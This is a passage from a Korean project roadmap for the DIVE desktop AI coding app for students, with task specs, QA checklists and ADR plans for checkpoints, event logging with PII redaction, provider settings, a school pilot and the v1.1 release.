       RequestVerify => Some(format!("[V 요청] {card_title}")),    // 신규
       Reject      => Some(format!("[V 거부] {card_title}")),      // 신규
       ReopenFromReject => None,  // 직전 Reject 스냅샷 사용
   };
   ```
2. **File changes 메타데이터**:
   - `CheckpointEngine::create_checkpoint` 확장 → `git2`로 이전 커밋 대비 변경 파일 목록 추출.
   - `CheckpointRow`에 `changed_files: Vec<String>` (JSON) + `stats: { added: u32, removed: u32, modified: u32 }` 컬럼 추가 (migration v4).
   - Timeline UI에 파일 수 + tooltip으로 파일명 리스트 표시.
3. **`checkpoint_restore` UX**:
   - Restore 전 confirm dialog: "이 체크포인트 (`<label>`, `<created_at>`)로 되돌립니다. 현재 변경 사항이 손실될 수 있습니다."
   - "현재 상태 자동 백업 후 복원" 옵션 기본 체크 → 복원 전 `kind=auto-pre-restore` 체크포인트 추가 생성.
   - 복원 완료 후 토스트 + workmap 재hydrate.

**테스트**:
- Rust: 4개 신규 트리거 각각 시나리오 — D→I, I→V, V reject 시 체크포인트 row 생성 + 라벨 + git SHA 확인.
- Rust: changed_files 메타 — 2커밋 사이 차이 계산 정확성.
- Playwright: Timeline에 D/I/V/E 각 전환별 체크포인트 표시 + 파일 변경 수 0이 아닌 값 표시.

**신규 ADR**:
- **ADR-061**: Checkpoint auto-trigger 전 단계 전환 포함 + changed_files 메타 + pre-restore 자동 백업.

**커밋 쌍**: `feat(checkpoint): auto-trigger on D/I/V/E transitions + pre-restore backup (task 7-21)` + `docs(sot): close 7-21 [ADR-061]`

### 0-22. EventLog 방출 커버리지 완성 (SPEC §10.5) (4주차)
**파일**: `dive/src-tauri/src/agent/mod.rs`, `dive/src-tauri/src/ipc/mod.rs`, `dive/src-tauri/src/dive/event_log.rs` (또는 기존 위치)

**SPEC 대비 현황**: EventLog 테이블은 존재하나 emission이 일부만. **감사 로그 / 파일럿 데이터 수집 신뢰성에 직결** — Track C 파일럿 2회차에서 이 데이터로 precision/recall 측정해야 함.

**SPEC 요구 vs 현재**:

| Event type | SPEC 요구 | 현재 emission |
|---|---|---|
| `stage_enter` / `stage_exit` | ✓ | ✗ |
| `card_create` / `card_update` / `card_delete` | ✓ | ✗ |
| `tool_approve` / `tool_reject` / `tool_complete` | ✓ | 부분 (`tool_call_approved/denied` only) |
| `checkpoint_create` | ✓ | ✓ (부분, manual만) |
| `checkpoint_restore` | ✓ | ✗ |
| `verify_start` / `verify_complete` | ✓ | `verify_started` / `verify_done` 이벤트만 (log 아님) |
| `error_occurred` | ✓ | ✗ |
| `session_start` / `session_end` | ✓ | ✗ |

**구현 사양**:

1. **통합 emission 함수**: `log_event(db, session_id, event_type, payload_json, card_id?)`.
2. **Call site 전수 조사** (Track 0-22에서 감사):
   - `chat_send` 시작/종료 → `session_start`/`session_end` (세션 단위) + `stage_enter` (D/I/V/E 별).
   - `card_create` / `card_update_instruction` / `card_transition` / `card_delete` IPC → 각자 `card_*` 이벤트.
   - Agent loop `tool_call_start` / `tool_approved` / `tool_denied` / `tool_result` → `tool_approve` / `tool_reject` / `tool_complete` + 에러 시 `tool_error`.
   - `checkpoint_create` / `checkpoint_restore` IPC → 대응 이벤트.
   - `card_verify` → `verify_start` / `verify_complete` with `{intent_match, test_result}`.
   - Agent loop / provider 오류 → `error_occurred { source, code, message_redacted }`.
3. **PII redaction**: EventLog payload는 export 시 그대로 나가므로 — **사용자 메시지 원문 금지**, 메시지 길이/해시만. 도구 arg 중 경로는 project_root 기준 상대 경로로. API key / token 정규식 마스킹.
4. **Export 포함**: 기존 `export_session` JSONL에 EventLog row 포함 (`type: "event"` 라인).

**Playwright / 단위 테스트**:
- Rust: 각 call site가 정확히 1개 EventLog row 삽입 확인 (중복/누락 없음).
- Playwright: 시나리오 실행 후 `export_session` JSONL 파싱 → 요구 event type 세트 완전 일치.
- Redaction 테스트: 사용자 메시지 `"API키: sk-abc"` 입력 → EventLog에 원문 없음, 해시 또는 마스킹된 값만.

**신규 ADR**:
- **ADR-062**: EventLog emission 완전성 + PII redaction 정책 + JSONL export 포함.

**커밋 쌍**: `feat(eventlog): complete emission coverage + PII redaction (task 7-22)` + `docs(sot): close 7-22 [ADR-062]`

### 0-23. V-stage 실 테스트 실행 (경량) (SPEC §4.4) (4주차, 선택적)
**파일**: `dive/src-tauri/src/dive/verify.rs`, `dive/src-tauri/src/tools/run_process.rs` (§0-19 의존)

**SPEC 대비 현황**: `verify.rs`가 `test_result`를 항상 `skipped` 반환 (코드 주석 확인: 실 테스트 실행 out-of-scope). Track C 파일럿에서 "V 게이트 작동 여부"가 핵심 관찰 대상인데 실 테스트 없이는 의미 약함.

**Track 0 경량 구현**:

1. **카드 metadata에 `test_command?: String` 필드 추가** (DB migration v5):
   - Instruct 단계에서 학생이 "검증 방법"을 자유 텍스트로 입력 가능 (예: `pnpm test src/App.test.ts`).
   - 없으면 `skipped` 유지 (기존 동작).
2. **`VerifyEngine::verify_card` 확장**:
   - `test_command`가 있고 §0-19의 `run_process` 사용 가능하면:
     - 권한 카드 `warn` → 사용자 승인 → 실행.
     - stdout/stderr 캡처 → exit code 기반 pass/fail.
     - timeout 60초.
   - 결과를 `VerifyLog { test_result: pass|fail|skipped, test_stdout, test_stderr, test_exit_code }`에 저장.
3. **UI 변경**:
   - Card detail 패널에 "검증 명령" 입력란 (optional).
   - Verify 실행 시 권한 카드 표시 → 승인 → 실행 → 결과 표시 (stdout 처음 20줄 + tail).
4. **보안**: §0-20 bash 하드닝과 동일 정책. `run_process`가 project_root 외부 금지 sandbox 적용.

**Track 0 범위 판단**: 구현 복잡도는 중간이나 **파일럿 2회차(Track C)에서 데이터 수집 의미를 살리려면 Track 0에 포함하는 것이 합리적**. 다만 4주차 마지막 작업이므로:
- 4주차 일정 여유 있으면 Track 0에 포함.
- 일정 타이트하면 **Track B로 이월** 허용. ADR-063에 판단 기록.

**신규 ADR**:
- **ADR-063**: V-stage 실 테스트 실행 경량 구현 — `test_command` 필드 + `run_process` 재사용. 파일럿 2회차 전 완료 우선순위.

**커밋 쌍**: `feat(verify): optional test_command execution via run_process (task 7-23)` + `docs(sot): close 7-23 [ADR-063]`

### 0-17. Track 0 Success Criteria

**Developer gate** (`pnpm tauri:dev`, wiremock provider):
1. 첫 실행 → Onboarding 자동 열림 + **4개 provider choice 표시** (Anthropic / OpenAI / OpenRouter / OpenCode Zen)
2. 잘못된 API 키 입력 → inline error (401 vs timeout 구분)
3. 올바른 키 입력 → health check 통과 → "연결됨"
4. 첫 프로젝트 생성 → 디스크 `dive.db` 파일 생성
5. 카드 3개 추가 → 지시 입력 → 채팅 1턴
6. Verify → approve → checkpoint 생성
7. 앱 재시작 → 프로젝트/카드/메시지/체크포인트 보존
8. Skip 버튼 → onboarded=false 유지 + 배너 표시
9. **opencode zen 실 키로 무료 모델 (gpt-5-nano) 1턴 채팅 성공** (수동, 팀원 1+)

**Release gate** (NSIS 설치 + tauri-driver 자동 스모크 + 수동 7종):
1. Clean 설치 → 자동 스모크가 dev gate 1~7 체크리스트 통과 (wiremock)
2. 수동: 실 Anthropic/OpenAI 키 1턴 채팅 (팀원 1+)
3. 수동: 앱 제거 → 재설치 → 데이터 초기화 확인
4. 수동: Windows x64 (필수) + ARM64 (CI 빌드 확인)
5. 수동: `dive.db` SQLite CLI로 직접 열어 schema_version, row 확인

둘 다 통과해야 `rc.2` 태그 푸시.

---

## 4. 트랙 B — 외부 자원 E2E + 실기 스모크 (5월 5~6주)

> **원칙**: 트랙 B의 모든 합격 기준은 **관찰 가능한 pass/fail 체크리스트**로 기술. 스크린샷 / 로그 / 빌드 해시 / 앱 버전이 아티팩트에 포함돼야 함.

### B-0. 블로커 / 논블로커 분류 규칙 (트랙 B 시작 전 확정)

발견된 회귀의 릴리스 블록 여부:
- **블로커 (rc.3 블록)**:
  - 인증 플로우 자체가 동작 안 함 (로그인 불가 / 토큰 저장 실패)
  - 실 provider 호출 시 500 이상 에러 재현율 50%+
  - Windows 실기에서 앱 크래시 또는 데이터 손상
  - 접근성: 키보드만으로 진입 불가능한 주요 UI
- **논블로커 (v1.1 이월 가능)**:
  - UX 문제 (메시지 문구, 색상 대비 단일 항목, 단축키 충돌)
  - 특정 엣지 케이스 (토큰 만료 정확히 0초, 타임존 변경 등)
  - 성능 (응답 지연이지만 동작은 함)
- **판단자**: 릴리스 담당자 (총괄 고규현). 회색 지대는 Oracle 상담 후 기록.

### B-1. 실 ChatGPT Plus/Pro Codex OAuth E2E
**사전 조건**: 협력 교사 또는 총괄 본인의 ChatGPT Plus 계정 1개, Windows 실기.

**체크리스트** (전체 통과 시 B-1 합격):
- [ ] 신규 로그인: 앱 → Codex 프로바이더 선택 → OAuth 브라우저 오픈 → PKCE 코드 교환 → access / refresh 토큰을 keyring scope `codex-default`에 저장
- [ ] **keyring 저장 확인**: Windows Credential Manager에서 해당 scope 항목 확인, 평문 localStorage에 토큰 없음 (devtools application 탭 확인)
- [ ] **앱 로그에 토큰 미노출**: `%LOCALAPPDATA%\...\logs\*.log` 전문 grep `Bearer ` / `sk-` / refresh token 없음
- [ ] 첫 채팅 1턴 성공 (실 Codex 응답)
- [ ] 앱 재시작 → 토큰 hydrate → 자동 인증됨
- [ ] **강제 access token 만료 시뮬**: Credential Manager에서 access token만 무효값으로 교체 → 다음 채팅 시 refresh flow 자동 수행 → 채팅 성공
- [ ] **강제 refresh token 만료 시뮬**: refresh token 무효화 → 채팅 시 reauth UI 등장 → 수동 재로그인 → 채팅 성공
- [ ] 로그아웃 → keyring 3-scope 전부 제거 확인 + 앱 UI "미연결" 상태
- [ ] **아티팩트**: `docs/codex-oauth-real-e2e.md` (앱 버전 / build hash / 계정 redact / 각 단계 스크린샷 / 로그 grep 결과)

**회귀 패치 경로**: `dive/src-tauri/src/auth/codex_oauth.rs` + 단위 테스트 추가.

### B-2. 실 MCP 서버 통합
**3종 각각 체크리스트 통과 시 B-2 합격**:

**B-2-a. `@modelcontextprotocol/server-filesystem` (stdio)**:
- [ ] MCP 서버 추가 UI에서 등록 → `mcp_server_test_connect` 성공
- [ ] `tools/list` 호출 → 최소 `read_file`, `write_file`, `list_directory` 확인
- [ ] `tools/call` 실행 시 권한 카드 표시 → 승인 → 결과 반환
- [ ] 거부 시 실행되지 않음 확인
- [ ] `mcp__filesystem__read_file` 네임스페이스로 채팅 tool 호출에서 사용 가능

**B-2-b. `@modelcontextprotocol/server-fetch` (stdio)**:
- [ ] 위와 동일한 체크리스트, `fetch` tool이 리스트에 있음
- [ ] 실 HTTP GET 1회 성공

**B-2-c. 임의 HTTP MCP + Bearer 인증**:
- [ ] 임시 HTTP MCP 서버 기동 (smithery registry에서 선택 또는 자체 Node.js 서버 30줄)
- [ ] Authorization: Bearer `<token>` 헤더 설정 UI → 등록 → 테스트 연결 성공
- [ ] 401 상황 재현 → 명확한 에러 메시지
- [ ] **Bearer token keyring 저장 확인** (평문 DB 저장 금지)

**아티팩트**: `docs/mcp-real-e2e.md` (3종 각각 / 앱 버전 / 스크린샷 / 실패 케이스 로그).

### B-3. Windows 실기 스모크 7종
**참조**: `docs/packaging-windows.md` §7 (0-12에서 확장된 체크리스트 사용)

- [ ] **x64 NSIS 설치**: silent installer / UI installer 양쪽 시도, `%LOCALAPPDATA%\Programs\DIVE\` 경로 확인
- [ ] **ARM64 NSIS 설치** (실기 있을 시): x64와 동일, 없으면 CI 빌드만 아카이브
- [ ] **첫 실행 Onboarding**: 한국어 OS에서 한국어 UI, 영어 OS에서 영어 UI
- [ ] **프로젝트 생성**: OneDrive 동기화 폴더에 생성 시 동작 확인 (학생 환경 고려)
- [ ] **채팅 + 권한 카드 + 체크포인트**: 생성·복원 사이클
- [ ] **익명화 export (JSONL)**: `export_session` IPC → 파일 다운로드 → 열어서 sensitive data 없음 확인
- [ ] **앱 제거 후 재설치**: `%LOCALAPPDATA%` 잔존 여부 확인, 재설치 시 온보딩 재개됨

**아티팩트**: `docs/smoke-test-2026-05.md` (담당자 서명 + 각 항목 pass/fail + 재현 환경).

### B-4. NVDA + 색맹 시뮬레이터 + 200% Zoom 수동 a11y
- [ ] NVDA 최신: 사이드바 → 워크맵 → 채팅 → 권한 카드 전체 탐색 가능 (키보드만)
- [ ] live region (`ToastProvider`)이 NVDA에서 읽힘
- [ ] Color Oracle 적록색각 시뮬: 카드 상태 구분 가능 (색 외 아이콘/텍스트 보조 확인)
- [ ] 200% Zoom에서 레이아웃 무너짐 없음 (수직 스크롤 허용, 수평 스크롤 금지)
- [ ] WCAG AA 대비: `docs/a11y-contrast.md`의 기존 측정값 재검증

**아티팩트**: `docs/a11y-manual-audit-2026-05.md` (각 항목 pass/fail + 스크린샷 / 녹화).

### B-5. ADR + 회귀 fix 커밋 + `1.0.0-rc.3` 태그

- B-1~4에서 블로커 회귀 발견 시 각각 `task 8-N` 커밋 쌍으로 수정.
- ADR-053+ (B-1~4 각 1건): "실 자원 E2E로 발견된 회귀 + 수정 방식".
- 자동 스모크 + 수동 7종 + B-1~4 + B-6~7 전체 통과 후 `rc.3` 태그.

### B-6. Custom OpenAI-compatible provider + 모델 셀렉터 활성화 (SPEC §7.6)
**파일**: 신규 provider adapter는 **불필요** (기존 `OpenAiProvider::with_base_url()` 재사용 가능), `dive/src/components/onboarding/OnboardingDialog.tsx`, `dive/src/pages/settings.tsx`, `dive/src/components/chat/ChatInput.tsx`

**SPEC 대비 현황**:
- 백엔드: `OpenAiProvider::with_base_url(url)` 이미 존재 → Custom OpenAI-compatible 지원 가능.
- 프론트: Onboarding / Settings에 "Custom" choice 없음.
- `ChatInput` 모델 셀렉터가 placeholder (disabled) 상태.

**구현 사양**:

1. **Provider choice 추가**: Onboarding + Settings에 **Custom (OpenAI-compatible)** 5번째. 입력 필드:
   - Base URL (예: `https://api.example.com/v1`)
   - API key
   - Model ID (수동 입력, `list_models`는 `/v1/models` 호출로 자동 populate)
2. **`ProviderKind::Custom`**: DB `kind = "custom"`, `config.base_url` 필드에 URL 저장.
3. **`factory::build_provider` Custom 분기**: `OpenAiProvider::new(key).with_base_url(url)`.
4. **health check**: `/v1/models` 동일. 실패 시 "사용자 지정 엔드포인트 응답 이상" 에러.
5. **모델 셀렉터 활성화**:
   - `ChatInput`의 disabled 모델 셀렉터 활성화.
   - `ProviderRuntime.provider.list_models()` 호출 → 드롭다운.
   - 선택 변경 시 `ProviderRuntime.model` 업데이트 + DB `provider_config.model_default` 갱신.
   - 세션 단위 override는 v1.1 이후 (Track D).

**테스트**:
- Rust: Custom base_url로 wiremock 엔드포인트 호출 → health check / chat 1턴.
- Playwright: Settings에서 Custom provider 추가 → 연결 → 모델 선택 → 채팅.

**신규 ADR**:
- **ADR-064**: Custom provider는 `OpenAiProvider` 재사용 (별도 adapter 금지) + 모델 셀렉터 runtime 연결.

### B-7. Provider settings 완전성 (SPEC §5.9)
**파일**: `dive/src/pages/settings.tsx`, `dive/src/components/shell/ProviderCard.tsx` (신규)

**SPEC 대비 현황**: 현재 settings의 provider 카드는 라벨 + 연결 점 + 연결/해제 버튼만. SPEC §5.9가 요구하는 메타 누락.

**보강 항목**:
- **Tier badge**: Free / Paid / Enterprise (각 provider별 정적 매핑 + OpenRouter는 메인키 기반 계산).
- **Auth method**: "API key" / "OAuth (ChatGPT Plus)" / "Custom" 표시.
- **Supported models**: `list_models()` 결과 compact 리스트 (앞 3개 + "그 외 N개" 펼침).
- **Last used time**: DB `messages` 테이블에서 해당 provider_config_id로 가장 최근 메시지 timestamp 조회. 신규 DAO 쿼리 `messages::last_used_by_provider(provider_config_id) -> Option<i64>`.
- **OpenRouter child-key 관리 섹션**: Settings의 OpenRouter 카드 확장 시 **"학생 키 발급" 버튼** → `openrouter_issue_key` IPC 호출 UI (label prefix + 한도 입력) + 현재 발급된 child key 리스트 + "전체 회수" 버튼.
  - 현재는 `pages/provisioning-demo.tsx` demo 페이지에만 존재 → Settings로 이전.

**테스트**:
- Playwright: Settings 진입 → 각 provider 카드가 5개 필드 모두 표시 확인.
- OpenRouter 섹션: issue_key / revoke_all 흐름.

**신규 ADR**:
- **ADR-065**: Provider settings 카드 5필드 표준 + OpenRouter 자식 키 관리 Settings 통합.

### B-8. ADR + 회귀 fix 커밋 + `1.0.0-rc.3` 태그 (최종)

위 B-6/7 포함하여 Track B 전체 완료 후 `rc.3` 태그.

---

## 5. 트랙 C — 토평고 파일럿 2회차 (5월 말~6월 초)

### C-1. 사전 점검
- `docs/pilot-checklist.md` 갱신: rc.1 yank 공지, rc.2/rc.3 배포 일정.
- `simulate-25-users.mjs` 사전 부하 → 클라이언트 측 lock 없음 확인.
- **학생 키 발급 흐름 확정 (OpenRouter child key)**:
  - 교사 main key 1개를 OpenRouter에서 발급 (교사 결제).
  - 수업 전, `openrouter_issue_key` IPC로 학생별 child key 25개 생성, label prefix 예: `tpy-2026-05-round2-`, 각 $5 한도.
  - 학생에게 배포 방식: 교사가 OS keyring에 직접 입력하도록 가이드하거나, 학교 공용 PC에 사전 입력 (개인정보 주의).
  - 수업 종료 후 `openrouter_revoke_all(label_prefix)`로 일괄 회수.
  - `docs/teacher-manual.md`에 이 흐름 섹션 추가 (ADR-053 참조).

### C-2. 진행 + 데이터 수집
- 익명화 export (JSONL): `export_session` 사용, 개인정보 필드 제거 검증.
- **모호함 감지 메트릭**:
  - 발동 횟수 / 오탐 (false positive) / 누락 (false negative) 각각 카운트.
  - 6차시 × 25명 = 최대 150 세션 단위 집계.
  - 기존 5룰 정규식별 precision / recall 계산.
- 학생 설문 1장 (각 차시 종료 5분): "모호함 경고가 도움이 되었는가?", "권한 카드가 방해가 되었는가?" 등 5문항.
- 교사 설문 1장 (2회차 종료): 질적 관찰.

### C-3. 회귀 / UX 픽스 + FAQ 갱신
- 발견된 회귀 → `task 9-N` fix 커밋 쌍.
- `docs/user-guide/faq.md` (현재 25개 → 파일럿 후 실 질문 ≥ 50% 갱신).

### C-4. 한국어 모호함 정규식 튜닝
**파일**: `dive/src/lib/ambiguity.ts` (5개 정규식 규칙 위치), 신규 `dive/src/lib/ambiguity.test.ts` (labeled corpus 기반 단위 테스트)

**현재 구조** (확인됨): frontend TypeScript 구현. `RULES` 배열에 `pronoun` / `ambiguous_time` / `vague_subject` / `vague_quantity` / `missing_target` 5개 규칙. 백엔드 Rust 구현은 없음 (prompt_check 엔진은 LLM 호출 분리).

- C-2 수집 데이터로 기존 5룰 precision / recall 측정 (파일럿 익명화 JSONL + 교사 라벨링).
- **튜닝 목표**: 전체 precision ≥ 0.8, recall ≥ 0.6 (1회차 baseline 대비 개선).
- 룰 추가/조정 시 `dive/src/lib/ambiguity.test.ts` 단위 테스트 필수 (labeled corpus fixture `dive/src/lib/ambiguity.fixtures.json`에 positive / negative 최소 20쌍).

**QA 시나리오**:
- **도구**: Vitest (`pnpm test ambiguity`) + 수동 precision/recall 계산 스크립트 (`dive/scripts/measure-ambiguity.mjs` 신규).
- **단계**: (1) fixture 20쌍 각 규칙별 매치/비매치 기대값 pass, (2) 파일럿 JSONL 입력 → TP/FP/FN 카운트 → precision/recall 계산, (3) baseline과 diff 출력.
- **기대 결과**: Vitest pass, 전체 precision ≥ 0.8 / recall ≥ 0.6 달성. 미달 시 규칙 수정 PR.

### C-5. 아티팩트
- ADR-054: 파일럿 2회차 결과 + 정규식 튜닝 결정.
- `docs/pilot-tpyeonggo-2026-05-report.md`: 정량 데이터 (표 + 차트), 정성 관찰, 결론.
- 블로커 회귀 없으면 `1.0.0-rc.4` 또는 `1.0.0-pilot.2` 태그.

### C-6. 채팅 메시지 edit / resend 와이어 (SPEC §5.3)
**파일**: `dive/src/components/shell/ChatArea.tsx`, `dive/src/components/chat/MessageList.tsx`, `dive/src/components/chat/UserMessage.tsx`, `dive/src/components/shell/MainShell.tsx`, `dive/src/hooks/useChatSession.ts`

**SPEC 대비 현황**: `MessageList` / `UserMessage` 컴포넌트에 onEdit / onResend prop이 있으나 `ChatArea`가 prop을 받지 않고 `MainShell`이 핸들러를 전달하지 않음. 기능 dead code.

**파일럿 시점에 필요 이유**: 학생이 오타 / 의도 변경 시 **재입력 없이 메시지 편집 후 재전송**이 학습 흐름 유지에 중요. 파일럿 1회차에서 학생 피드백으로 요구된 기능으로 가정 (Track C에서 확정).

**구현 사양**:
- `useChatSession`에 `editUserMessage(messageId, newText)` / `resendFromMessage(messageId)` 추가.
- 백엔드: `chat_edit_and_resend(session_id, message_id, new_text)` IPC → 해당 메시지 이후 messages 삭제(soft: status="edited") → 새 user_message 삽입 → agent loop 재시작.
- UI: 각 user_message에 연필/새로고침 아이콘, 호버 시 노출. 키보드: 메시지 포커스 + `E` / `R`.

**QA 시나리오**:
- **도구**: Playwright (`dive/scripts/verify-chat-edit-resend.mjs` 신규) + Rust 단위 테스트 (`dive/src-tauri/tests/it_chat_edit_resend.rs`).
- **단계**:
  1. 세션 + 카드 1개 생성 → user 메시지 "hello" → assistant 응답 수신.
  2. user 메시지 hover → 연필 아이콘 노출 확인 → 클릭 → textarea에 기존 텍스트 prefill.
  3. 텍스트 수정 ("hello world") → Enter → `chat_edit_and_resend` IPC 호출.
  4. DB 확인: 기존 assistant 메시지 status="edited", 새 user_message + 새 assistant 응답 삽입.
  5. 키보드 플로우: 메시지에 Tab focus → `E` 키 → editor 열림 / `R` 키 → 곧바로 재전송.
- **기대 결과**:
  - 메시지 순서 DB row order + UI render 모두 보존 (edit 시점 이후는 soft delete, 이전은 유지).
  - `chat-edit` EventLog row 1건 삽입 (§0-22).
  - Playwright `pass=4/4`, Rust test `cargo test it_chat_edit_resend` pass.

**신규 ADR**: ADR-055 (번호 재할당) — 메시지 편집/재전송 UX + 이후 메시지 soft delete 정책.

---

## 6. 트랙 D — v1.1 통합 + 출시 (6~7월)

### D-1. 영어 i18n 완성
**현재**: Sidebar / MainShell 배너만 i18n. PromptHelper 템플릿, PromptCheckDialog, Codex OAuth 다이얼로그, MCP 설정 UI 등 한국어 하드코딩.

- 한국어 리터럴 grep → 키 추출 → `en.json` 번역.
- `verify-i18n.mjs` 강화: 영어 키 패리티 검사 (ko.json의 모든 키가 en.json에 존재) + 누락 시 테스트 실패.
- `card-state-meta.ts` data-* 리팩터 후 라벨 번역.
- **검수**: 원어민 또는 교육용 영어 리뷰어 1명 (자문 이장원 교수 네트워크 활용).

**QA 시나리오**:
- **도구**: `node dive/scripts/verify-i18n.mjs` + Playwright `verify-i18n.mjs` (locale 스위치).
- **단계**: (1) ko.json / en.json 키 diff 없음 확인, (2) locale=en으로 앱 실행 → PromptHelper / PromptCheckDialog / Codex OAuth / MCP UI 각 1회 열기, (3) 각 스크린샷에서 한국어 문자 (Unicode 범위 U+AC00~U+D7AF) 부재 확인 (스크립트 정규식).
- **기대 결과**: 스크립트 exit 0, 스크린샷 5장 모두 clean (0 한국어 매치).

### D-2. 토큰 비용 환산 UI
**파일**: 신규 `dive/src/lib/token-pricing.ts`, `dive/src/i18n/pricing.json`, `dive/src/components/chat/TokenCostBadge.tsx`

**가격표 신선도 전략** (ADR-055):
- `pricing.json` 스키마:
  ```json
  {
    "version": "2026-05",
    "last_checked": "2026-05-20",
    "sources": {
      "anthropic": "https://docs.anthropic.com/en/docs/about-claude/models#model-pricing",
      "openai": "https://openai.com/api/pricing/",
      "openrouter": "https://openrouter.ai/models"
    },
    "models": {
      "claude-sonnet-4-5": {
        "provider": "anthropic",
        "input_per_1m_usd": 3.0,
        "output_per_1m_usd": 15.0,
        "effective_date": "2026-04-01"
      }
    }
  }
  ```
- **UI 명시**: TokenCostBadge에 "추정" 라벨 + `last_checked` 날짜 표시. 실 청구는 provider 콘솔 참조 문구.
- **알 수 없는 모델 폴백**: 토큰 수만 표시, 비용 자리에 "가격 정보 없음".
- **텔레메트리 금지 원칙 준수** (§9.4): 원격 페치 안 함. 앱 업데이트 시에만 갱신 (Tauri Updater와 함께 배포).
- **릴리스 체크리스트 항목**: 매 rc 태그 푸시 전 `last_checked` 30일 이내인지 확인, 아니면 갱신 PR 선행.

**QA 시나리오**:
- **도구**: Vitest 단위 테스트 (`dive/src/lib/token-pricing.test.ts`) + Playwright (`dive/scripts/verify-token-cost.mjs`).
- **단계**: (1) `computeCost({provider, model, input_tokens, output_tokens})` 알려진/미지 모델 4케이스, (2) ChatInput 하단에 TokenCostBadge 렌더링 확인, (3) 채팅 1턴 후 USD 추정치 + "추정 · `last_checked`" 각주 표시, (4) 미지 모델 시나리오에서 "가격 정보 없음" 폴백.
- **기대 결과**: Vitest 4/4 pass, Playwright 모든 assert pass, `last_checked` 파싱 ISO-8601.

### D-3. macOS / Linux 빌드
- `pnpm tauri:build:dmg` / `pnpm tauri:build:appimage`.
- CI 매트릭스 확장: `.github/workflows/build.yml`에 `macos-latest`, `ubuntu-latest` 추가.
- **키링 대응**:
  - macOS: `security-framework` (keyring crate 기본 지원).
  - Linux: `secret-service` (gnome-keyring/kwallet). 학교 PC 환경에서 secret-service 부재 시 처리:
    - **결정 (ADR-056)**: 최초 빌드는 `file-backed keyring` + 사용자 passphrase (`keyring` crate `file-keyring` feature). OS keyring과 hybrid. `InMemoryKeyring`은 dev/test 전용 유지.
    - 설치 시 검사: secret-service 가용 여부 → 없으면 설치 마법사에서 passphrase 설정 유도.

**QA 시나리오**:
- **도구**: GitHub Actions CI (`.github/workflows/build.yml` matrix) + 수동 실기.
- **단계**: (1) CI에서 macOS / Linux 아티팩트 생성 확인, (2) macOS 수동: `.dmg` 설치 → keychain 항목 `com.dive.app` 생성 확인 → provider_connect → 앱 재시작 후 키 유지, (3) Linux (Ubuntu 22.04): `secret-service` 있는 환경 → 위와 동일, (4) Linux `secret-service` 제거한 컨테이너 → 첫 실행 시 passphrase 프롬프트 → 키 저장 → 재시작 시 passphrase 입력 → 키 로드.
- **기대 결과**: 3개 OS × 3개 키링 시나리오 모두 pass. CI 아티팩트 업로드.

### D-4. Tauri Updater
- `tauri-plugin-updater` 추가 + GitHub Releases `latest.json` 자동 생성 (release.yml).
- 서명 키 페어 발급 → **공개키는 `tauri.conf.json`에 하드코딩, 개인키는 1Password + 2명 보관 (총괄 + 김나영)**.
- **백업 절차 ADR-057**: 개인키 분실 시 자동 업데이트 영구 차단 → 재발급 절차 문서화 (새 키로 마이그레이션 = 기존 설치자 전원 수동 재설치 필요) + 연 1회 복원 테스트.
- Settings에 "새 버전 확인" 버튼 + 자동 확인 토글 (기본 true, 교사가 학교망에서 끌 수 있음).

**QA 시나리오**:
- **도구**: 수동 실기 (Windows) + GitHub Release sandbox (dummy 버전 태그).
- **단계**: (1) v1.0.999-test 태그로 `latest.json` + 서명된 installer 업로드, (2) 설치된 v1.0.0-rc.2 앱에서 Settings "새 버전 확인" → 업데이트 감지 → 승인 → 다운로드 → 재시작 → 버전 1.0.999-test 확인, (3) 잘못된 서명(다른 키 페어) installer로 공격 시뮬 → 앱이 거부하고 에러 표시, (4) 자동 확인 OFF 상태에서 재시작 → 자동 감지 안 됨.
- **기대 결과**: 4단계 전부 정상 동작. 서명 검증 실패 시 앱 무결성 유지.

### D-5. 교사 대시보드 초안
- 별도 정적 사이트 `dive-dashboard/` (React + Vite).
- JSONL 업로드 → 학급 통계 (카드 수 / 차시별 평균 / 모호함 경고 빈도).
- v1.1은 **초안만** (데모 수준). 본격 구현은 v2.0.
- 저장소 분리 여부는 D 시작 시 결정 (monorepo vs separate repo).

**QA 시나리오**:
- **도구**: Vitest + Playwright on dive-dashboard Vite dev server.
- **단계**: (1) 샘플 JSONL 3개 (1명 / 10명 / 25명분) 업로드, (2) 각 통계 카드 (총 카드 수, 평균 차시 소요, 모호 경고 빈도) 수치 계산 검증 (Vitest 유닛), (3) 차트(Recharts 등) 렌더 확인, (4) 잘못된 JSONL 입력 시 에러 메시지.
- **기대 결과**: 통계 수치가 직접 계산한 정답과 일치 (오차 < 1%). 차트 픽셀 회귀 없음.

### D-6. axe-core 통합
- Playwright + `@axe-core/playwright`: 5개 주요 페이지 (Main, Settings, Onboarding, NewProject, PromptHelper) 자동 a11y 검사.
- allowlist 관리 (`dive/tests/a11y-allowlist.json`): 기존 회귀는 이월 표시, 신규 violation은 PR 블록.

**QA 시나리오**:
- **도구**: `node dive/scripts/verify-axe.mjs` (신규) + GitHub Actions PR 체크.
- **단계**: (1) 5개 페이지 각각 `page.evaluate(axe.run)` 호출, (2) violation 목록을 allowlist와 diff, (3) 신규 violation 발견 시 exit 1 + PR comment.
- **기대 결과**: CI가 main 기준으로 0 new violations 유지. allowlist 항목은 issue 번호 참조 필수.

### D-7. 코드 서명 + v1.1.0 릴리스
- Azure Trusted Signing 또는 EV 인증서 결정 (D 시작 시 가격·절차 확인).
- `tauri.conf.json` `signCommand` 추가.
- 3곳 버전 동기화 → `git tag v1.1.0` → `release.yml` → draft 검토 → publish.
- 릴리스 노트: rc.1 yank부터 v1.1까지 변화 요약, 영어/한국어 병기.

**QA 시나리오**:
- **도구**: Windows 실기 + SmartScreen + `signtool verify`.
- **단계**: (1) CI artifact `.exe` 다운로드, (2) `signtool verify /pa /v DIVE_1.1.0_x64-setup.exe` → 서명 체인 유효 확인, (3) Windows SmartScreen 반응 관찰 (Microsoft Defender ATP 평판 쌓이기 전엔 경고 가능, 이후 사라짐), (4) 설치 → 첫 실행 → 온보딩 동작, (5) Release publish 후 `pnpm install -g dive` 유사 fetch로 해시 일치 확인.
- **기대 결과**: signtool verify exit 0. 3곳 버전 문자열 일치 (`tauri.conf.json` / `package.json` / `Cargo.toml`).

### D-8. 접근성 키보드 보강 (SPEC §12.2)
**파일**: `dive/src/components/permission-card/DangerCard.tsx`, `dive/src/hooks/useGlobalShortcuts.ts`, `dive/src/components/slide-in/SlideInPanel.tsx`

**SPEC 대비 현황**:
